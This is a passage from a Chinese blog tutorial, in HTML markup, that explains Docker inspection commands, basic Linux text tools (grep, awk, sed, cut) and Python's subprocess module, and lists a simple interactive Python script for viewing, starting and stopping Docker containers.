punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-8、查看正在运行的容器的IP地址（或所有）"><a href="#1-8、查看正在运行的容器的IP地址（或所有）" class="headerlink" title="1.8、查看正在运行的容器的IP地址（或所有）"></a>1.8、查看正在运行的容器的IP地址（或所有）</h4><h5 id="1-8-1、第一种方式"><a href="#1-8-1、第一种方式" class="headerlink" title="1.8.1、第一种方式"></a>1.8.1、第一种方式</h5><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#docker inspect --format '{{ .NetworkSettings.IPAddress }}' container_id</span>~ docker inspect --format <span class="token string">'{{ .NetworkSettings.IPAddress }}'</span> 1c70a141029c172.17.0.2<span class="token comment" spellcheck="true">#这里其实是docker inspect 的一种属性查询，从NetworkSettings找到IPAddress这个属性即可</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="1-8-2、第二种方式"><a href="#1-8-2、第二种方式" class="headerlink" title="1.8.2、第二种方式"></a>1.8.2、第二种方式</h5><pre class="line-numbers language-bash"><code class="language-bash">➜  ~ docker inspect -f <span class="token string">'{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}'</span> 1c70a141029c172.17.0.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="1-8-、第三种方式"><a href="#1-8-、第三种方式" class="headerlink" title="1.8.、第三种方式"></a>1.8.、第三种方式</h5><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#这里借用Linux系统命令将docker inspect的信息作为输入来进行处理，不会的命令可以看Linux基本命令这一节</span>➜  ~ docker inspect 1c70a141029c <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"IPAddress"</span> <span class="token operator">|</span> <span class="token function">tail</span> -n 1<span class="token operator">|</span> <span class="token function">awk</span> -F <span class="token string">':'</span> <span class="token string">'{print <span class="token variable">$2</span>}'</span> <span class="token operator">|</span> <span class="token function">cut</span> -b 3-12 172.17.0.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="1-8-4、查看所有正在运行的容器的IP地址"><a href="#1-8-4、查看所有正在运行的容器的IP地址" class="headerlink" title="1.8.4、查看所有正在运行的容器的IP地址"></a>1.8.4、查看所有正在运行的容器的IP地址</h5><pre class="line-numbers language-bash"><code class="language-bash">➜  ~ docker inspect --format<span class="token operator">=</span><span class="token string">'{{.Name}} - {{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}'</span> <span class="token variable"><span class="token variable">$(</span>docker <span class="token function">ps</span> -aq<span class="token variable">)</span></span>/wordpress - 172.17.0.4/db.wordpress - 172.17.0.3/httpbin - 172.17.0.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-9、查看容器映射的端口"><a href="#1-9、查看容器映射的端口" class="headerlink" title="1.9、查看容器映射的端口"></a>1.9、查看容器映射的端口</h4><h5 id="1-9-1、第一种方式"><a href="#1-9-1、第一种方式" class="headerlink" title="1.9.1、第一种方式"></a>1.9.1、第一种方式</h5><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#docker port 与docker container port命令执行起来得到的结果一样</span>➜  ~ docker port 2f23a0ef7add3306/tcp -<span class="token operator">></span> 0.0.0.0:3306<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="1-9-2、第二种方式"><a href="#1-9-2、第二种方式" class="headerlink" title="1.9.2、第二种方式"></a>1.9.2、第二种方式</h5><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#这样可以直接看到正在映射过去的端口，缺点是无法看到映射前的端口</span>➜  ~ docker inspect 2f23a0ef7add  <span class="token operator">|</span> <span class="token function">grep</span> HostPort <span class="token operator">|</span> <span class="token function">head</span> -n 1 <span class="token operator">|</span> <span class="token function">awk</span> -F <span class="token string">':'</span> <span class="token string">'{print<span class="token variable">$2</span>}'</span> <span class="token operator">|</span> <span class="token function">awk</span> -F <span class="token string">' '</span> <span class="token string">'{print <span class="token variable">$1</span>}'</span> <span class="token operator">|</span> <span class="token function">sed</span>  $<span class="token string">'s/\"//g'</span>3306<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="1-10、查看容器的名称"><a href="#1-10、查看容器的名称" class="headerlink" title="1.10、查看容器的名称"></a>1.10、查看容器的名称</h4><h5 id="1-10-1、查看正在运行的的容器的名称"><a href="#1-10-1、查看正在运行的的容器的名称" class="headerlink" title="1.10.1、查看正在运行的的容器的名称"></a>1.10.1、查看正在运行的的容器的名称</h5><pre class="line-numbers language-bash"><code class="language-bash">➜  ~ docker <span class="token function">ps</span> -a <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"Up"</span> <span class="token operator">|</span> <span class="token function">awk</span> -F <span class="token string">" "</span> <span class="token string">'{print <span class="token variable">$NF</span>}'</span> <span class="token operator">|</span> <span class="token function">grep</span> -v NAMEShttpbin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="1-10-2、查看所有的容器的名称"><a href="#1-10-2、查看所有的容器的名称" class="headerlink" title="1.10.2、查看所有的容器的名称"></a>1.10.2、查看所有的容器的名称</h5><pre class="line-numbers language-bash"><code class="language-bash">➜  ~ docker <span class="token function">ps</span> -a <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">""</span> <span class="token operator">|</span> <span class="token function">awk</span> -F <span class="token string">" "</span> <span class="token string">'{print <span class="token variable">$NF</span>}'</span> <span class="token operator">|</span> <span class="token function">grep</span> -v NAMESwordpressdb.wordpresshttpbin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、Linux基本命令"><a href="#2、Linux基本命令" class="headerlink" title="2、Linux基本命令"></a>2、Linux基本命令</h3><h4 id="2-1、"><a href="#2-1、" class="headerlink" title="2.1、|"></a>2.1、|</h4><p>​        “命令格式：<strong>命令A|命令B</strong>，即命令1的正确输出作为命令B的操作对象”</p><img src="https://s1.ax1x.com/2020/04/09/Gh6vGj.png"><p>比如说：</p><pre class="line-numbers language-bash"><code class="language-bash">docker inspect container_id <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"IPAddress"</span><span class="token comment" spellcheck="true">#将前面查看container_id的具体信息作为输入条件，grep命令在输入的具体信息中寻找与"IPAddress"有关的内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="2-2、grep"><a href="#2-2、grep" class="headerlink" title="2.2、grep"></a>2.2、grep</h4><p>​        grep命令的常用格式为：grep  [选项]  ”模式“  [文件]，在本文中用不到[选项]这个内容。这个命令的意思是在文件中寻找与模式相匹配的内容。</p><p>比如说：</p><pre class="line-numbers language-bash"><code class="language-bash">➜  ~ <span class="token function">grep</span> <span class="token string">"IPAddress"</span> info.txt             <span class="token string">"SecondaryIPAddresses"</span><span class="token keyword">:</span> null,            <span class="token string">"IPAddress"</span><span class="token keyword">:</span> <span class="token string">"172.17.0.3"</span>,                    <span class="token string">"IPAddress"</span><span class="token keyword">:</span> <span class="token string">"172.17.0.3"</span>,<span class="token comment" spellcheck="true">#在info.txt这个文件中找到与"IPAddress"相匹配的内容并将其打印出来</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-3、awk"><a href="#2-3、awk" class="headerlink" title="2.3、awk"></a>2.3、awk</h4><p>​        awk命令比较复杂，这里只说与本文有关内容。</p><p>​        这里使用例子：<code>awk -F " " '{print $NF}'</code>，将前面的输出作为输入进行处理，使用” “（空格）作为分割符，打印最后一列，其中 <code>$NF</code> 代表最后一列，<code>$1</code> 代表第一列，依次往后推</p><h4 id="2-4、sed"><a href="#2-4、sed" class="headerlink" title="2.4、sed"></a>2.4、sed</h4><p>​        sed命令比较复杂，这里只说与本文有关内容。</p><p>​        这里使用例子 <code>sed  $'s/\"//g'</code> ，这里<code>s/</code>代表搜索，<code>\</code> 表示转义，也就是说将 <code>"</code> （双引号）进行转义，然后<code>/</code>表示格式，<code>/g</code>表示全局搜索，而两个<code>/</code>中间没有内容表示空，所以整个语句的意思就是说把双引号去除。 </p><h4 id="2-5、cut"><a href="#2-5、cut" class="headerlink" title="2.5、cut"></a>2.5、cut</h4><p>​        cut 命令从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段写至标准输出。</p><p>​        这里使用例子：<code>cut -b 3-12"</code> ，<code>-b</code>  表示以字节为单位进行分割。输出第3个到第12个中间的内容</p><h3 id="3、Python常用库"><a href="#3、Python常用库" class="headerlink" title="3、Python常用库"></a>3、Python常用库</h3><h4 id="3-1、subprocess"><a href="#3-1、subprocess" class="headerlink" title="3.1、subprocess"></a>3.1、subprocess</h4><p>​        subprocess模块中的 <code>getoutput</code> 这个函数可以接受Linux命令执行后返回的结果。</p><p>比如说：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> subprocess<span class="token operator">>></span><span class="token operator">></span> s <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>getoutput<span class="token punctuation">(</span><span class="token string">'cat /etc/issue'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> s<span class="token string">'Ubuntu 16.04.6 LTS \\n \\l\n'</span><span class="token comment" spellcheck="true">#这使得命令返回的结果更容易被处理</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-2、time"><a href="#3-2、time" class="headerlink" title="3.2、time"></a>3.2、time</h4><p>​        time模块中的<code>sleep</code>函数可以让程序等待指定的时间。</p><h2 id="二、代码清单"><a href="#二、代码清单" class="headerlink" title="二、代码清单"></a>二、代码清单</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python3</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*- </span><span class="token comment" spellcheck="true"># --author：valecalida--</span><span class="token comment" spellcheck="true"># Edit time: 2020/3/17 19:39</span><span class="token triple-quoted-string string">"""代码简陋，大佬勿喷"""</span><span class="token keyword">from</span> subprocess <span class="token keyword">import</span> getoutput <span class="token keyword">as</span> shell<span class="token keyword">import</span> sys<span class="token punctuation">,</span> timetotal_docker_id <span class="token operator">=</span> <span class="token string">"docker ps -a -q"</span>unalive_docker_id <span class="token operator">=</span> <span class="token string">"docker ps -a | grep Exited | awk -F ' ' '{print $1}' "</span>unalive_docker_name <span class="token operator">=</span> <span class="token string">"docker ps -a | grep Exited | awk -F ' ' '{print $NF}'"</span>alive_docker_id <span class="token operator">=</span> <span class="token string">"docker ps -q"</span>get_name_part1 <span class="token operator">=</span> <span class="token string">"docker ps -a | grep "</span>get_name_part2 <span class="token operator">=</span> <span class="token string">" | awk -F ' ' '{print $NF}' | grep -v NAMES"</span>get_ip_part1 <span class="token operator">=</span> <span class="token string">"docker inspect "</span>get_ip_part2 <span class="token operator">=</span> <span class="token string">" | grep 'IPAddress' | tail -n 1 | awk -F ':' '{print $2}' | cut -b 3-12"</span>get_port <span class="token operator">=</span> <span class="token string">" | grep HostPort | head -n 1 | awk -F ':' '{print$2}' | awk -F ' ' '{print $1}' | sed  $'s/\"//g'"</span>start_ins <span class="token operator">=</span> <span class="token string">"docker start "</span>stop_ins <span class="token operator">=</span> <span class="token string">"docker stop "</span><span class="token keyword">def</span> <span class="token function">alive_instance_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""这是当前存活的实例的个数"""</span>    alive_instances <span class="token operator">=</span> shell<span class="token punctuation">(</span>alive_docker_id<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> alive_instances<span class="token punctuation">,</span> len<span class="token punctuation">(</span>alive_instances<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_alive_instances_infos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""显示当前正在运行的docker实例"""</span>    containers_id<span class="token punctuation">,</span> _ <span class="token operator">=</span> alive_instance_info<span class="token punctuation">(</span><span class="token punctuation">)</span>    containers<span class="token punctuation">,</span> containers_ip<span class="token punctuation">,</span> containers_name<span class="token punctuation">,</span> containers_port<span class="token punctuation">,</span> ins_code <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> containers_id<span class="token punctuation">:</span>        containers_name<span class="token punctuation">.</span>append<span class="token punctuation">(</span>shell<span class="token punctuation">(</span>get_name_part1 <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> get_name_part2<span class="token punctuation">)</span><span class="token punctuation">)</span>        containers_ip<span class="token punctuation">.</span>append<span class="token punctuation">(</span>shell<span class="token punctuation">(</span>get_ip_part1 <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> get_ip_part2<span class="token punctuation">)</span><span class="token punctuation">)</span>        containers_port<span class="token punctuation">.</span>append<span class="token punctuation">(</span>shell<span class="token punctuation">(</span>get_ip_part1 <span class="token operator">+</span> str<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> get_port<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>containers_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        containers<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>str<span class="token punctuation">(</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> containers_id<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">,</span> containers_name<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">,</span> containers_ip<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">,</span> containers_port<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        ins_code<span class="token punctuation">.</span>append<span class="token punctuation">(</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> containers<span class="token punctuation">,</span> ins_code<span class="token keyword">def</span> <span class="token function">show_alive_instance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    containers<span class="token punctuation">,</span> _ <span class="token operator">=</span> get_alive_instances_infos<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\tNow,the instances running are list as follows: "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\t实例编号\t容器的ID\t\t容器的名字\t容器的IP\t容器的端口"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>containers<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\t%4s\t\t%s\t\t%s\t%s\t%s"</span> <span class="token operator">%</span><span class="token punctuation">(</span>containers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>containers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>str<span class="token punctuation">.</span>center<span class="token punctuation">(</span>containers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span>containers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>str<span class="token punctuation">.</span>center<span class="token punctuation">(</span>containers<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">unalive_instances</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""当前没有运行的实例的ID"""</span>    unalive_instance <span class="token operator">=</span> shell<span class="token punctuation">(</span>unalive_docker_id<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> unalive_instance<span class="token punctuation">,</span> len<span class="token punctuation">(</span>unalive_instance<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_unalive_instances_infos</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    container_id<span class="token punctuation">,</span> _ <span class="token operator">=</span> unalive_instances<span class="token punctuation">(</span><span class="token punctuation">)</span>    containers_name <span class="token operator">=</span> shell<span class="token punctuation">(</span>unalive_docker_name<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>    containers_ip<span class="token punctuation">,</span> containers<span class="token punctuation">,</span> ins_code <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> container_id<span class="token punctuation">:</span>        containers_ip<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"未运行,无IP"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> k <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>containers_ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        containers<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span>str<span class="token punctuation">(</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> container_id<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">,</span> containers_name<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">,</span> containers_ip<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        ins_code<span class="token punctuation">.</span>append<span class="token punctuation">(</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> containers<span class="token punctuation">,</span> ins_code<span class="token keyword">def</span> <span class="token function">show_unalive_instance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    containers<span class="token punctuation">,</span> _ <span class="token operator">=</span> get_unalive_instances_infos<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\tNow,the instances not running are list as follows: "</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\t实例编号\t容器的ID\t\t容器的名字\t\t容器的IP"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> container <span class="token keyword">in</span> containers<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> info <span class="token keyword">in</span> container<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t%4s"</span> <span class="token operator">%</span> info<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">"\t "</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">start_instance</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>    containers <span class="token operator">=</span> value    <span class="token keyword">for</span> container <span class="token keyword">in</span> containers<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            shell<span class="token punctuation">(</span>start_ins <span class="token operator">+</span> container<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"start %s successful"</span> <span class="token operator">%</span> container<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> BaseException <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开启实例的时候好像出了点问题..."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">stop_instance</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>    containers <span class="token operator">=</span> value    <span class="token keyword">for</span> container <span class="token keyword">in</span> containers<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            shell<span class="token punctuation">(</span>stop_ins <span class="token operator">+</span> container<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"stop %s successful"</span> <span class="token operator">%</span> container<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> BaseException <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"关闭实例的时候好像出了点问题..."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">docker_menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">">>"</span> <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">"Docker managemet program by valecalida"</span><span class="token punctuation">,</span> <span class="token string">"&lt;&lt;"</span> <span class="token operator">*</span> <span class="token number">5</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\t1 >> 查看当前docker的运行状态"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\t2 >> 开启指定(全部)容器"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\t3 >> 关闭指定(全部)容器"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t\tq >> 退出程序(q)"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        docker_menu<span class="token punctuation">(</span><span class="token punctuation">)</span>        len_alive <span class="token operator">=</span> len<span class="token punctuation">(</span>shell<span class="token punctuation">(</span>alive_docker_id<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        total <span class="token operator">=</span> len<span class="token punctuation">(</span>shell<span class="token punctuation">(</span>total_docker_id<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        len_unalive <span class="token operator">=</span> total <span class="token operator">-</span> len_alive        user_choice_1 <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"输入您想要进行的操作的序号 >> "</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> user_choice_1 <span class="token operator">==</span> <span class="token string">'q'</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\t程序将在一秒后自动退出'</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> user_choice_1 <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> len_alive <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">and</span> len_unalive <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                show_unalive_instance<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> len_unalive <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">and</span> len_alive <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                show_alive_instance<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">elif</span> len_alive <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">and</span> len_unalive <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                show_unalive_instance<span class="token punctuation">(</span><span class="token punctuation">)</span>                show_alive_instance<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">elif</span> user_choice_1 <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> len_unalive <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t当前没有未开启的docker容器\n"</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                show_unalive_instance<span class="token punctuation">(</span><span class="token punctuation">)</span>                containers<span class="token punctuation">,</span> ins_code <span class="token operator">=</span> get_unalive_instances_infos<span class="token punctuation">(</span><span class="token punctuation">)</span>                user_choice_2 <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"请输入您想要启动的docker实例编号(a all) >> "</span><span class="token punctuation">)</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> user_choice_2 <span class="token operator">==</span> <span class="token string">'a'</span><span class="token punctuation">:</span>                        start_instance<span class="token punctuation">(</span>containers<span class="token punctuation">)</span>                    <span class="token keyword">elif</span> user_choice_2 <span class="token operator">==</span> <span class="token string">'q'</span><span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\t正在返回上级菜单..."</span><span class="token punctuation">)</span>                    <span class="token keyword">elif</span> int<span class="token punctuation">(</span>user_choice_2<span class="token punctuation">)</span> <span class="token keyword">in</span> ins_code<span class="token punctuation">:</span>                        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>ins_code<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                            <span class="token keyword">if</span> int<span class="token punctuation">(</span>user_choice_2<span class="token punctuation">)</span> <span class="token operator">==</span> i <span class="token operator">+</span> <span class="token 